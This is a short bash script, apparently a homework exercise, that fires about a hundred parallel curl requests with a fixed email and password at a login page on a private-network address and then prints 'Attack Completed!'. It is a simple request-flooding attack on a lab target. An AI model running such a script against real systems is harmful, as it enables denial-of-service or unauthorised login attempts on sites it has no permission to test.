#!/bin/bash

task(){
    curl -s "http://192.168.0.117/Homework3/final/index.php?email=aaaaaaaaaaaaaaa!&password=test" > /dev/null
}

N=1000

(
for i in {0..100}; do
   ((i=i%N)); ((i++==0)) && wait
   task "$i" &
done
)

echo "Attack Completed!"